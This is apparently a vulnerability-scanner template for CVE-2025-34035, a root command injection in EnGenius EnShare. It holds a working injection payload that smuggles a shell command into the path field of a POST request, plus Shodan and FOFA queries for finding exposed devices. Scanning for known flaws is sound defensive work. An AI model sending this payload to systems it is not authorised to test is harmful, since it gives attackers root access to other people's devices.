id: CVE-2025-34035

info:
  name: EnGenius EnShare Cloud Service - Command Injection
  severity: critical
  author: darses
  description: |
    EnGenius EnShare Cloud Service <= 1.4.11 contains an OS command injection caused by improper sanitization of user input in usbinteract.cgi path parameter, letting unauthenticated remote attackers execute commands as root.
  impact: |
    Unauthenticated remote attackers can execute arbitrary commands with root privileges, leading to full system compromise.
  remediation: |
    Update to a version later than 1.4.11 or the latest available version.
  classification:
    cve-id: CVE-2025-34035
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.87323
    epss-score: 0.03607
    cwe-id:
      - CWE-20
      - CWE-78
  metadata:
    verified: true
    max-requests: 1
    vendor: engeniustech
    product: enshare
    shodan-query:
      - "/web/cgi-bin/usbinfo.cgi"
    fofa-query:
      - "/web/cgi-bin/usbinfo.cgi"
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2025-34035
    - https://www.exploit-db.com/exploits/42114
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php
  tags: cve,cve2025,rce,engeniustech,iot

http:
  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      action=7&path="|id||"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "uid=0(root) gid=0(root)"
          - "Content-type: text/html"
        condition: and
